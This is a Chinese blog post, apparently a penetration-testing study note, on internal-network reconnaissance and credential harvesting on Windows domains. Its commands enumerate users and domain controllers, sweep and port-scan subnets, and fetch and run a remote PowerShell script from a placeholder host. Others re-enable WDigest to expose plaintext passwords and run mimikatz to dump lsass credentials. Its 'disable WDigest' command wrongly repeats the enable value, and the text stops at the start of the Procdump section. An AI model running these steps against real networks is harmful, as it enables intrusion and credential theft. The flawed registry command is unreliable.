@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="本机、域内、主机发现、端口扫描Banner、凭据获取">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网信息搜集">
+<meta property="og:url" content="https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/index.html">
+<meta property="og:site_name" content="killeveee">
+<meta property="og:description" content="本机、域内、主机发现、端口扫描Banner、凭据获取">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/28629982/1702544302343-090bca95-f207-4c5c-9ded-4b1a361f2136.png#averageHue=%23141210&clientId=uf2cdc0af-1588-4&from=paste&height=343&id=uf88a3811&originHeight=655&originWidth=1058&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=133407&status=done&style=none&taskId=u146c8e40-810c-4c68-8f36-4231bf12d3f&title=&width=554.45458984375">
+<meta property="article:published_time" content="2023-12-21T07:11:33.000Z">
+<meta property="article:modified_time" content="2023-12-26T13:59:26.721Z">
+<meta property="article:author" content="killeveee">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/28629982/1702544302343-090bca95-f207-4c5c-9ded-4b1a361f2136.png#averageHue=%23141210&clientId=uf2cdc0af-1588-4&from=paste&height=343&id=uf88a3811&originHeight=655&originWidth=1058&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=133407&status=done&style=none&taskId=u146c8e40-810c-4c68-8f36-4231bf12d3f&title=&width=554.45458984375">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>内网信息搜集</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/12/23/Windows%E6%8F%90%E6%9D%83%EF%BC%88%E4%B8%8A%EF%BC%89/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/12/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&text=内网信息搜集"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&title=内网信息搜集"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&is_video=false&description=内网信息搜集"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网信息搜集&body=Check out this article: https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&title=内网信息搜集"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&title=内网信息搜集"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&title=内网信息搜集"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&title=内网信息搜集"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&name=内网信息搜集&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&t=内网信息搜集"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">本机</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">域内</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">内网资源探测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.1.</span> <span class="toc-text">发现存活主机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.1.</span> <span class="toc-text">1、ICMP协议-网络层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.2.</span> <span class="toc-text">2、NetBIOS协议-会话层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.3.</span> <span class="toc-text">3、UDP协议-传输层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.4.</span> <span class="toc-text">4、ARP协议-网络层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.5.</span> <span class="toc-text">5、SMB协议-应用层</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.2.</span> <span class="toc-text">内网端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.2.1.</span> <span class="toc-text">1、Telnet 探测端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.2.2.</span> <span class="toc-text">2、nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.2.3.</span> <span class="toc-text">3、利用PowerShell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.3.</span> <span class="toc-text">MetaSploit探测内网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.4.</span> <span class="toc-text">获取端口Banner</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.4.1.</span> <span class="toc-text">1、NetCat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.4.2.</span> <span class="toc-text">2、Telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.4.3.</span> <span class="toc-text">3、Nmap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">用户凭据</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.1.</span> <span class="toc-text">获取单机密码和哈希值</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.1.1.</span> <span class="toc-text">mimikatz在线读取lsass进程内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.1.2.</span> <span class="toc-text">mimikatz离线读取lsass进程内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.1.3.</span> <span class="toc-text">mimikatz在线读取SAM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.1.4.</span> <span class="toc-text">mimikatz离线读取SAM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.2.</span> <span class="toc-text">获取应用软件凭据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.2.1.</span> <span class="toc-text">RDP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.2.2.</span> <span class="toc-text">Xshell</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        内网信息搜集
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">killeveee</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-21T07:11:33.000Z" class="dt-published" itemprop="datePublished">2023-12-21</time>
+        
+      
+    </div>
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1><span id="本机">本机</span></h1><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">whoami <span class="token operator">/</span>all	查看当前用户、权限
+net user				查看本地用户
+net localgroup	查看本地组
+query user			查看当前登录用户
+
+ipconfig <span class="token operator">/</span>all	查看网络配置信息
+rout print	查看路由信息
+
+systeminfo	查看OS信息
+systeminfo <span class="token punctuation">|</span> findstr <span class="token operator">/</span>B <span class="token operator">/</span>C:<span class="token string">"OS Name"</span> <span class="token operator">/</span>C:<span class="token string">"OS Version"</span>	查看OS系统及版本
+systeminfo <span class="token punctuation">|</span> findstr <span class="token operator">/</span>B <span class="token operator">/</span>C:<span class="token string">"OS 名称"</span> <span class="token operator">/</span>C:<span class="token string">"OS 版本"</span>	查看OS系统及版本
+
+netstat <span class="token operator">-</span>ano	查看端口连接信息
+net session		查看当前会话列表
+net share			查看当前网络共享信息
+net use				查看已连接的网络共享
+
+tasklist			查看进程信息
+tasklist <span class="token operator">/</span>SVC	杀软进程识别，将执行结果放到网上的Windows杀软在线识别网站
+wmic 可以查询进程的路径
+wmic查看自启动、补丁、应用安装
+
+schtasks <span class="token operator">/</span>query <span class="token operator">/</span>v <span class="token operator">/</span>fo list	查看计划任务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1><span id="域内">域内</span></h1><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net config workstation	查看是否存在域环境
+
+net user <span class="token operator">/</span>domain	查看域用户
+net <span class="token function">group</span> <span class="token operator">/</span>domain	查看域用户组
+
+net <span class="token function">group</span> <span class="token string">"Domain Controller"</span> <span class="token operator">/</span>domain	查看域控制器列表
+net time <span class="token operator">/</span>domain	查看主域控制器<span class="token punctuation">;</span>在域中域控作为时间服务器，所有计算机时间同步
+ping 域控名 DC-1<span class="token punctuation">.</span>hack-my<span class="token punctuation">.</span>com		定位域控<span class="token punctuation">,</span>得到域控ip地址<span class="token punctuation">;</span>也可以通过DNS服务器地址定位域控
+
+net accounts <span class="token operator">/</span>domain	查看域内密码策略<span class="token punctuation">,</span>以此构造字典进行爆破
+
+nltest <span class="token operator">/</span>domain_trusts		查看域信任关系<span class="token punctuation">;</span>用户多域环境中的跨域资源的共享<span class="token punctuation">,</span>查看当前主机所在域和其他域的信任关系<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>1、查看是否有域环境<br>2、域内用户、用户组<br>3、定位域控：</p>
+<ul>
+<li>域控是时间服务器，使域内所有计算机时间同步：<code>net time /domain</code>可以获得域控主机名</li>
+<li>域控是DNS服务器，域内的所有计算机的DNS服务器都是域控ip</li>
+<li>直接<code>ping 主机名</code>可以得到ip地址</li>
+</ul>
+<p>4、查看域内密码策略：得到密码长度等信息，一次构造密码爆破字典<br>5、是否有多个域：信任关系</p>
+<h1><span id="内网资源探测">内网资源探测</span></h1><h2><span id="发现存活主机">发现存活主机</span></h2><p>在渗透测试过程中，可以根据目标主机的情况，进行选择。</p>
+<ol>
+<li>上传工具执行</li>
+<li>内网代理或路由转发</li>
+</ol>
+<p>**<em>发现存活主机可以选用ICMP、NetBIOS、UDP、ARP、SNMP、SMB等多种网络协议</em>**。</p>
+<h3><span id="1-icmp协议-网络层">1、ICMP协议-网络层</span></h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token keyword">for</span> <span class="token operator">/</span>L <span class="token operator">%</span>I in <span class="token punctuation">(</span>1<span class="token punctuation">,</span>1<span class="token punctuation">,</span>254<span class="token punctuation">)</span> <span class="token keyword">DO</span> @ping <span class="token operator">-</span>w 1 <span class="token operator">-</span>n 1 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span><span class="token operator">%</span>I <span class="token punctuation">|</span> findstr <span class="token string">"TTL="</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>使用ICMP协议循环探测整个局域网C段中的存活主机<br>C段是什么？ip地址组成：A.B.C.D<br>C段嗅探：拿下与它同一个C段中的主机</p>
+<h3><span id="2-netbios协议-会话层">2、NetBIOS协议-会话层</span></h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nbtscan<span class="token punctuation">.</span>exe 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以将nbtscan.exe上传到目标主机执行，也可以通过代理本地执行。<br>NetBIOS是什么？NetBIOS是OSI会话层的协议。让不同计算机上运行的不同程序可以在局域网中互相连接和共享数据。简单来说就是一种应用程序接口API。操作系统通过不同模式将NetBIOS名称解析为IP地址。<br>若向IP地址发送NetBIOS状态查询，可以获得主机名、MAC地址等。<br>NBTScan是扫描网络上NetBIOS名称的程序。可以对给定IP范围内的每个IP地址发送NetBIOS状态查询，获取IP地址、计算机名、登陆用户、MAC地址。</p>
+<h3><span id="3-udp协议-传输层">3、UDP协议-传输层</span></h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">unicornscan <span class="token operator">-</span>mU 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>将空的UDP报文发送到目标主机，若得到一个ICMP无法到达的回应报文，则说明此端口关闭并且主机存活。<br>Unicornscan是kali的一款信息搜集工具，有网络扫描的功能。此命令通过UDP协议扫描内网存活主机。</p>
+<h3><span id="4-arp协议-网络层">4、ARP协议-网络层</span></h3><p>命令：<code>**arp -a**</code><br>1）arp-scan</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">arp-scan<span class="token punctuation">.</span>exe <span class="token operator">-</span>t 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>ARP协议做MAC地址和IP地址的映射。<br>arp-scan是一款工具，用arp发现内网中存活的主机。<br>2）powershell<br><a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1">Invoke-ARPScan.ps1</a>是**<em>Empire渗透框架</em>**的一个ps脚本，用ARP发现存活主机</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span><span class="token operator">/</span><span class="token function">Invoke-ARPscan</span><span class="token punctuation">.</span>ps1	导入模块
+<span class="token function">Invoke-ARPscan</span> <span class="token operator">-</span>CIDR 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>0/24	执行
+
+或者远程导入<span class="token punctuation">,</span>要开web服务
+powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span>Command <span class="token string">"IEX(NEW-Object Net.WebClient).DownloadString('http:x.x.x.x/Invoke-ARPscan.ps1');Invoke-ARPscan -CIDR 10.10.10.0/24"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3><span id="5-smb协议-应用层">5、SMB协议-应用层</span></h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">crackmapexec smb 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>CrackMapExec（CME）是十分强大的后渗透工具，能枚举登录用户、枚举SMB服务列表……<br>SMB协议 又称为 网络文件共享系统CIFS<br>CIFS消息使用NetBIOS和TCP协议发送，分别使用139、445端口，现在倾向于使用445端口。<br>NetBIOS和SMB好的，让我们想象你的计算机是一个大办公室，里面有许多员工，每个员工都有自己的文件柜和打印机。</p>
+<ol>
+<li><strong>计算机间通信（NetBIOS）：</strong></li>
+</ol>
+<ul>
+<li><strong>NetBIOS就像办公室的内部电话系统，</strong>帮助员工之间相互通话和交流。它让计算机能够互相识别和找到对方，就像员工可以通过内部电话系统找到其他同事一样。</li>
+</ul>
+<ol start="2">
+<li><strong>文件共享和资源访问（SMB）：</strong></li>
+</ol>
+<ul>
+<li><strong>SMB就像员工在办公室中共享文件柜和打印机，</strong>允许计算机之间共享文件和打印机资源。当你从一台计算机访问另一台计算机上的共享文件夹时，就好像你的办公室同事借阅了你的文件。</li>
+</ul>
+<p>所以，NetBIOS提供了计算机之间的基本通信手段，就像内部电话系统一样。而SMB建立在这种通信基础上，使计算机能够共享文件和打印机，就像在办公室中共享资源一样。</p>
+<h2><span id="内网端口扫描">内网端口扫描</span></h2><p>找到开发端口，确定开放的服务，服务版本，对应的漏洞。进行下一步攻击。</p>
+<h3><span id="1-telnet-探测端口">1、Telnet 探测端口</span></h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">telnet &lt;IP> &lt;Port><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Telnet是远程登录的<br>这个命令可以用来简单测试该端口是打开还是关闭</p>
+<h3><span id="2-nmap">2、nmap</span></h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nmap <span class="token operator">-</span>p 80<span class="token punctuation">,</span>88<span class="token punctuation">,</span>135<span class="token punctuation">,</span>139<span class="token punctuation">,</span>445<span class="token punctuation">,</span>8080<span class="token punctuation">,</span>3306<span class="token punctuation">,</span>3389 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10					扫描指定端口
+nmap <span class="token operator">-</span>sS <span class="token operator">-</span>p 1-65535 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10																扫描全部端口
+nmap <span class="token operator">-</span><span class="token function">sC</span> <span class="token operator">-</span><span class="token function">sV</span> <span class="token operator">-</span>p 80<span class="token punctuation">,</span>88<span class="token punctuation">,</span>135<span class="token punctuation">,</span>139<span class="token punctuation">,</span>445<span class="token punctuation">,</span>8080<span class="token punctuation">,</span>3306<span class="token punctuation">,</span>3389 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10	扫描并获取端口服务信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3><span id="3-利用powershell">3、利用PowerShell</span></h3><p><strong><em>NiShang渗透测试框架</em></strong> 集成了各种脚本和Payload，广泛用于渗透测试各个阶段。<br>NiShang的Scan模块中也有一个Invoke-PortScan.ps1脚本，可以端口扫描：</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">扫默认端口：<span class="token function">Invoke-PortScan</span> <span class="token operator">-</span>StartAddress 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>1 <span class="token operator">-</span>EndAddress 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>20 <span class="token operator">-</span>ResolveHost <span class="token operator">-</span>ScanPort
+扫指定端口：<span class="token function">Invoke-PortScan</span> <span class="token operator">-</span>StartAddress 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>1 <span class="token operator">-</span>EndAddress 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>20 <span class="token operator">-</span>ResolveHost <span class="token operator">-</span>ScanPort <span class="token operator">-</span>Port 80<span class="token punctuation">,</span>88<span class="token punctuation">,</span>135<span class="token punctuation">,</span>139<span class="token punctuation">,</span>443<span class="token punctuation">,</span>8080<span class="token punctuation">,</span>3306<span class="token punctuation">,</span>3389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>对指定范围10.10.10.1-20进行端口扫描。</p>
+<h2><span id="metasploit探测内网">MetaSploit探测内网</span></h2><h2><span id="获取端口banner">获取端口Banner</span></h2><p>“Banner”（中文可以翻译为”横幅”）通常指的是网络服务或应用程序在响应请求时发送的一段文字信息。这个信息包含了服务或应用程序的版本、类型、厂商等关键信息。Banner通常用于标识和识别正在运行的服务，有助于网络管理员、渗透测试人员或攻击者了解系统的配置和漏洞。<br>简单说就是标识服务类型的。</p>
+<h3><span id="1-netcat">1、NetCat</span></h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nc <span class="token operator">-</span><span class="token function">nv</span> &lt;IP> &lt;Port><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>NetCat可以轻易建立任何连接，“瑞士军刀”。<br>“-nv”选项可以在连接指定端口时，获取该端口的Banner信息。</p>
+<h3><span id="2-telnet">2、Telnet</span></h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">telnet &lt;IP> &lt;Port><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>若端口开放，telnet在连接时会返回相应的Banner</p>
+<h3><span id="3-nmap">3、Nmap</span></h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nmap <span class="token operator">--</span>script=banner <span class="token operator">-</span>p 21<span class="token punctuation">,</span>22<span class="token punctuation">,</span>23<span class="token punctuation">,</span>80<span class="token punctuation">,</span>3389<span class="token punctuation">,</span>3306 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>“–script&#x3D;banner”选项可以获取端口的Banner</p>
+<h1><span id="用户凭据">用户凭据</span></h1><h2><span id="获取单机密码和哈希值">获取单机密码和哈希值</span></h2><p>关于SAM文件、lsass.exe等，看之前博客：<a href="https://killeveee.github.io/2022/07/20/kerberos%E5%8D%8F%E8%AE%AE/">https://killeveee.github.io/2022/07/20/kerberos%E5%8D%8F%E8%AE%AE/</a><br>补充WDigest和Tspkg&gt; 用户输入密码登录后，登录的域名、用户名、登录凭据等信息会存储在lsass.exe的进程空间中，用户的明文密码结果WDigest和Tspkg模块调用后，会对其用可逆的加密并存储在内存中。</p>
+<ul>
+<li>WDigest是Windows用于处理HTTP身份验证的协议。允许使用明文，允许在内存中存储用户的明文密码。</li>
+<li>Tspkg是Windows中的一个安全支持提供程序SSP，提供对CredSSP的支持。</li>
+</ul>
+<p>！！！注意！！！<br>为了防止用户的明文密码在内存中泄露，微软发布了KB2871997补丁，关闭WDigest功能，禁止从内存获取明文密码。<br>Windows2012及以上默认关闭WDigest<br>【抓不到明文，解决方案】<br>修改注册表，可以重启WDigest，然后等或者强制用户重新登陆后，就可以获取到用户的明文密码。</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 开启WDigest</span>
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest <span class="token operator">/</span>v UseLogonCredential <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 1 <span class="token operator">/</span>f
+
+<span class="token comment"># 关闭WDigest</span>
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest <span class="token operator">/</span>v UseLogonCredential <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 1 <span class="token operator">/</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3><span id="mimikatz在线读取lsass进程内存">mimikatz在线读取lsass进程内存</span></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords full"</span> <span class="token builtin class-name">exit</span>
+<span class="token comment"># privilege::debug，提升至DebugPrivilege权限</span>
+<span class="token comment"># sekurlsa::logonpasswords，导出用户凭据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>DebugPrivilege是个啥是一种特殊权限，允许用户或进程拥有 **调试 **其它进程的能力！可以使用调试器来检查、修改其它进程的内存….<br>使用<code>whoami /priv</code>命令可以查看当前用户的权限。还有其它很多权限。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/28629982/1702544302343-090bca95-f207-4c5c-9ded-4b1a361f2136.png#averageHue=%23141210&clientId=uf2cdc0af-1588-4&from=paste&height=343&id=uf88a3811&originHeight=655&originWidth=1058&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=133407&status=done&style=none&taskId=u146c8e40-810c-4c68-8f36-4231bf12d3f&title=&width=554.45458984375" alt="image.png"></p>
+<h3><span id="mimikatz离线读取lsass进程内存">mimikatz离线读取lsass进程内存</span></h3><p>离线就是把lsass.exe的进程内存转储，下载到本地，用mimikatz离线读取。<br>1）转储进程内存的工具有很多，如OutMinidump.ps1、Procdump、SharpDump、系统自带comsvcs.dll……<br>微软官方提供的Procdump：</p>
